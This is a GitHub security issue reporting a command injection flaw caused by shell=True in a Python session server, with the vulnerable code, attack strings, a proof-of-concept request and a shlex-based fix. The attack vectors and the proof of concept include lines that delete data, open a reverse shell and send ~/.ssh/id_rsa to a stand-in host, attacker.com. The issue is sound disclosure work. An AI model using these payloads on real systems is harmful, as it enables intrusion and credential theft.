# GitHub Issue: Command Injection Vulnerability

**Title:** [Security] CRITICAL: Command Injection via shell=True in simple_session_server.py

**Labels:** `security`, `critical`, `bug`

---

## Summary

A **critical command injection vulnerability** exists in the Simple Session Server's bash command execution function. Despite implementing a whitelist of "safe" commands, the use of `subprocess.run()` with `shell=True` allows attackers to bypass the whitelist entirely using shell metacharacters (`;`, `|`, `&&`, `||`, `$()`, etc.) to execute arbitrary commands on the server.

**Severity:** CRITICAL (CVSS 9.8)
**Affected File:** `empirica/cli/simple_session_server.py` (lines 188-217)

## Affected Code

```python
def _run_bash(self, session: dict, command: str) -> dict:
    """Run safe bash command"""
    safe_commands = ["ls", "pwd", "cat", "head", "tail", "wc", "grep", "find"]

    cmd_parts = command.split()
    if not cmd_parts or cmd_parts[0] not in safe_commands:
        return {"error": "Command not allowed", "allowed": safe_commands}

    try:
        result = subprocess.run(
            command,           # ← String passed to shell
            shell=True,        # ← CRITICAL VULNERABILITY
            cwd=session["cwd"],
            capture_output=True,
            text=True,
            timeout=10
        )
```

## Attack Vectors

1. **Command Chaining:** `ls; rm -rf /tmp/data`
2. **Command Substitution:** `ls $(whoami > /tmp/pwned)`
3. **Pipe Redirection:** `ls | curl -X POST http://attacker.com --data-binary @-`
4. **Background Execution:** `pwd && nohup bash -c 'reverse_shell' &`
5. **Logical Operators:** `cat /dev/null || malicious_command`

## Proof of Concept

```bash
POST /sessions/{session_id}/command HTTP/1.1
Content-Type: application/json

{
  "command": "run_bash",
  "args": {
    "command": "ls; cat ~/.ssh/id_rsa | curl -X POST http://attacker.com/keys --data-binary @-"
  }
}
```

## Impact Assessment

| Factor | Rating | Justification |
|--------|--------|---------------|
| Attack Vector | Network | HTTP API accessible over network |
| Attack Complexity | Low | Simple HTTP POST request |
| Privileges Required | None | No authentication implemented |
| User Interaction | None | Fully automated exploitation |
| Confidentiality | High | Full file system read access |
| Integrity | High | Can modify/delete any files |
| Availability | High | Can crash services or consume resources |

## Recommended Fix

```python
import shlex

def _run_bash(self, session: dict, command: str) -> dict:
    safe_commands = ["ls", "pwd", "cat", "head", "tail", "wc", "grep", "find"]

    try:
        cmd_parts = shlex.split(command)
    except ValueError as e:
        return {"error": f"Invalid command syntax: {e}"}

    if not cmd_parts or cmd_parts[0] not in safe_commands:
        return {"error": "Command not allowed"}

    # Reject dangerous characters
    dangerous_chars = [';', '|', '&', '$', '`', '>', '<', '(', ')']
    if any(char in command for char in dangerous_chars):
        return {"error": "Command contains forbidden characters"}

    result = subprocess.run(
        cmd_parts,         # ← Pass as list
        shell=False,       # ← NEVER use shell=True
        cwd=session["cwd"],
        capture_output=True,
        text=True,
        timeout=10,
        env={},            # Empty env for security
    )
```

## Additional Recommendations

1. Add authentication to all endpoints
2. Implement path traversal protection
3. Change default bind from `0.0.0.0` to `127.0.0.1`
4. Add rate limiting
5. Consider removing bash execution feature entirely

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess security](https://docs.python.org/3/library/subprocess.html#security-considerations)
